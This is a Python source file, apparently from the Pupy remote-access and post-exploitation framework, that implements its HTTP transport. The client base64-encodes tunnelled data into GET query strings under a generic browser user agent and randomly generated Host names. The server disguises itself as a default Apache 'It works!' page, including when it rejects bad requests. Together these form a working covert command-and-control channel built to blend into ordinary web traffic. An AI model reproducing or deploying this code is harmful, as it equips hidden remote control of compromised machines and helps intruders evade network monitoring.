# -*- coding: utf-8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms

""" This module contains an implementation of the 'http' transport for pupy. """

__all__ = (
    'InvalidHTTPReq',
    'MalformedData',
    'PupyHTTPClient',
    'PupyHTTPServer',
)

from ..base import BasePupyTransport
import base64
import random
import string
import logging
import threading
import time

class InvalidHTTPReq(Exception):
    __slots__ = ()

class MalformedData(Exception):
    __slots__ = ()

error_response_body="""<html><body><h1>It works!</h1>
<p>This is the default web page for this server.</p>
<p>The web server software is running but no content has been added, yet.</p>
</body></html>"""
error_response="HTTP/1.1 200 OK\r\n"
error_response+="Server: Apache\r\n"
error_response+="Content-Type: text/html; charset=utf-8\r\n"
error_response+="Content-Length: %s\r\n"%len(error_response_body)
error_response+="\r\n"
error_response+=error_response_body

class PupyHTTPTransport(BasePupyTransport):
    """
    Implements the http protocol transport for pupy.
    """
    __slots__ = ()

class PupyHTTPClient(PupyHTTPTransport):
    client = True
    method = 'GET'
    keep_alive = True
    path = '/index.php?d='
    user_agent = 'Mozilla/5.0'
    host = None # None for random
    proxy = False
    payload_max_size = 1024 * 3

    __slots__ = (
        'headers',  'polled', 'host', 'path'
    )

    def __init__(self, *args, **kwargs):
        PupyHTTPTransport.__init__(self, *args, **kwargs)
        self.headers = {
            'User-Agent': self.user_agent,
            'Connection': 'keep-alive',
        }

        self.polled = False

        if 'host' in kwargs:
            self.host = kwargs['host']

        if self.host is not None:
            self.headers['Host'] = self.host

        if 'Host' not in self.headers:
            self.headers['Host'] = '.'.join([
                'www',
                ''.join(
                    random.choice(string.ascii_lowercase
                ) for _ in range(0, random.randint(7,10))),
                'com'
            ])

        if 'proxy' in kwargs:
            self.path = 'http://{}{}'.format(self.headers['Host'], self.path)

        if 'auth' in kwargs:
            self.headers['Proxy-Authorization'] = \
              'Basic ' + base64.b64encode('{}:{}'.format(*kwargs['auth']))

    def _upstream_recv(self, data):
        try:
            d = data.read(self.payload_max_size)

            request = '%s %s%s HTTP/1.1\r\n'%(self.method, self.path, base64.urlsafe_b64encode(d))

            for name, value in self.headers.iteritems():
                request += '%s: %s\r\n'%(name, value)

            if self.keep_alive:
                request += 'Connection: keep-alive\r\n'

            request += '\r\n'

            if not self.polled:
                self.polled = True

                request += '%s %s%s HTTP/1.1\r\n'%(
                    self.method, self.path, 'poll&_={}'.format(time.time()))

                for name, value in self.headers.iteritems():
                    request += '%s: %s\r\n'%(name, value)

                if self.keep_alive:
                    request += 'Connection: keep-alive\r\n'

                request += '\r\n'

            self.downstream.write(request)

        except Exception as e:
            logging.exception(e)

    def upstream_recv(self, data):
        """
            raw data to HTTP request
        """

        while len(data) > 0:
            self._upstream_recv(data)

    def downstream_recv(self, data):
        """
            HTTP response to raw data
        """
        d = data.peek()
        decoded_data = b''
        poll_required = False
        #let's parse HTTP responses :

        while len(d)>0 and d.startswith('HTTP/1.1 ') and '\r\n\r\n' in d:
            head, rest = d.split('\r\n\r\n', 1)
            fl, rheaders = head.split('\r\n',1)
            content_length = None
            for name, value in [[i.strip() for i in x.split(':',1)] for x in rheaders.split('\r\n')]:
                if name.lower() == 'content-length':
                    content_length = int(value)
                elif name.lower() == 'x-poll-required':
                    poll_required = True

            if content_length is None:
                logging.exception('dafuk ? content-length is None')
                self.close()
                return

            elif len(rest)<content_length:
                break

            if content_length > 0:
                decoded_data += base64.urlsafe_b64decode(rest[:content_length])

            length_to_drain = content_length+4+len(head)

            data.drain(length_to_drain)

            d = d[length_to_drain:]

        if decoded_data or poll_required:
            self.upstream.write(decoded_data)

            request = '%s %s%s HTTP/1.1\r\n'%(self.method, self.path, 'poll&_={}'.format(time.time()))
            for name, value in self.headers.iteritems():
                request += '%s: %s\r\n'%(name, value)

            if self.keep_alive:
                request += 'Connection: keep-alive\r\n'

            request += '\r\n'

            self.downstream.write(request)

class PupyHTTPServer(PupyHTTPTransport):
    client=False
    response_code='200 OK'
    server_header='Apache'
    path='/index.php?d='
    verify_user_agent=None # set to the user agent to verify or None not to verify

    __slots__ = (
        'headers',  'polled',
        'pending_data', 'polled_lock', 'polled',
        'no_pipelining_timeout', 'pipelining',
        'last_access', 'poll_flusher_started',
        'poll_flusher_thread'
    )

    def __init__(self, *args, **kwargs):
        PupyHTTPTransport.__init__(self, *args, **kwargs)
        self.pending_data = []
        self.polled_lock = threading.Lock()
        self.polled = 0
        self.no_pipelining_timeout = 0.1
        self.pipelining = threading.Event()
        self.last_access = None
        self.poll_flusher_started = False
        self.poll_flusher_thread = None
        self.headers = {
            'Content-Type': 'text/html; charset=utf-8',
            'Server': self.server_header,
            'Connection': 'Keep-Alive',
        }

    def on_close(self):
        self.pipelining.set()

    def poll_flusher(self):
        while not self.pipelining.is_set():
            with self.polled_lock:
                if not self.pending_data:
                    if self.polled > 0 and (time.time() - self.last_access > self.no_pipelining_timeout):
                        self.polled -= 1

                        response = 'HTTP/1.1 %s\r\n'%self.response_code

                        for name, value in self.headers.iteritems():
                            response +='%s: %s\r\n'%(name, value)

                        response += 'Content-Length: 0\r\n'

                        if self.polled == 0:
                            response += 'X-Poll-Required: true\r\n'

                        response += '\r\n'
                        self.downstream.write(response)

            time.sleep(self.no_pipelining_timeout)

    def upstream_recv(self, data):
        """
            raw data to HTTP response
        """
        if self.closed:
            return

        encoded_data = None
        payload = data.read()

        with self.polled_lock:
            if self.polled > 0:
                self.polled -= 1

                encoded_data = base64.urlsafe_b64encode(b''.join(self.pending_data) + payload)
                self.pending_data = []

            else:
                self.pending_data.append(payload)

            if encoded_data:
                response = 'HTTP/1.1 %s\r\n'%self.response_code
                for name, value in self.headers.iteritems():
                    response += '%s: %s\r\n'%(name, value)

                response += 'Content-Length: %s\r\n'%len(encoded_data)
                response += '\r\n'
                response += encoded_data

                self.downstream.write(response)

    def http_req2data(self, s):
        if not s.startswith(('GET ', 'POST ', 'HEAD ', 'PUT ')):
            raise InvalidHTTPReq()

        first_line, headers=s.split('\r\n',1)

        if self.verify_user_agent is not None:
            found_ua=False
            try:
                for name, value in [[i.strip() for i in x.split(':',1)] for x in headers.split('\r\n')]:
                    if name.lower()=='user-agent':
                        if value.strip()==self.verify_user_agent.strip():
                            found_ua=True
            except:
                raise MalformedData('invalid user agent')

            if not found_ua:
                raise MalformedData('invalid user agent')

        if not first_line.endswith(' HTTP/1.1'):
            raise InvalidHTTPReq()

        method, path, http_ver=first_line.split()
        payload = path[len(self.path):]

        if payload.startswith('poll'):
            return None

        try:
            decoded_data = base64.urlsafe_b64decode(payload)
        except:
            raise MalformedData("can't decode b64")

        return decoded_data

    def downstream_recv(self, data):
        """
            HTTP requests to raw data
        """

        d = data.peek()
        decoded_data = b''
        tab = d.split('\r\n\r\n')

        requests = 0

        if not d.endswith('\r\n\r\n'):
            tab = tab[:-1] #last part is not complete yet

        for req in tab:
            newdata = None

            try:
                if req:
                    requests += 1

                    newdata = self.http_req2data(req)
                    if newdata is not None:
                        decoded_data += newdata

                    data.drain(len(req)+4)
                else:
                    continue

            except (MalformedData, InvalidHTTPReq):
                logging.exception('invalid/malformed data, answering 404 and closing connection')
                self.downstream.write(error_response)
                self.close()
                return

            except Exception as e:
                logging.exception(e)
                break

            if newdata is not None:
                response = 'HTTP/1.1 %s\r\n'%self.response_code

                for name, value in self.headers.iteritems():
                    response +='%s: %s\r\n'%(name, value)

                response += 'Content-Length: 0\r\n'
                response += '\r\n'

                with self.polled_lock:
                    self.downstream.write(response)

            else:
                encoded_data = None

                with self.polled_lock:
                    pending_data = None

                    if self.pending_data:
                        pending_data = b''.join(self.pending_data)
                        self.pending_data = []

                    if pending_data:
                        encoded_data = base64.urlsafe_b64encode(pending_data)
                    else:
                        self.polled += 1

                    if encoded_data:
                        response = 'HTTP/1.1 %s\r\n'%self.response_code
                        for name, value in self.headers.iteritems():
                            response += '%s: %s\r\n'%(name, value)

                        response += 'Content-Length: %s\r\n'%len(encoded_data)
                        response += '\r\n'
                        response += encoded_data

                        self.downstream.write(response)

        if decoded_data:
            self.upstream.write(decoded_data)

        if requests > 1:
            self.pipelining.set()

        if not self.pipelining.is_set() and self.polled:
            with self.polled_lock:
                self.last_access = time.time()

            if not self.poll_flusher_started:
                self.poll_flusher_started = True
                self.poll_flusher_thread = threading.Thread(target=self.poll_flusher)
                self.poll_flusher_thread.daemon = True
                self.poll_flusher_thread.start()
